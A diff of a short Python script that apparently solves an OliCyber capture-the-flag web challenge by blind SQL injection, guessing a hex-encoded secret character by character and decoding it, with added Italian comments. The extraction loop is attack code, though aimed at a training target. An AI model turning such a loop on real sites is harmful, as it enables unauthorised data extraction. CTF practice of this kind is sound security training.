@@ -1,5 +1,4 @@
 from sqlinjection import Inj
-
 inj = Inj('http://web-17.challs.olicyber.it')
 
 dictionary = '0123456789abcdef'
@@ -11,8 +10,12 @@ while True:
         response, error = inj.blind(question)
         if response == 'Success': # We have a match!
             result += c
+            print(result)
             break
     else:
-        break
+        break # Yup, i cicli for in Python hanno una sezione else.
+              # Significa che abbiamo esaurito i caratteri del
+              # dizionario.
 
-print(result)
+bytes = bytes.fromhex(result)
+print(bytes.decode('utf-8'))
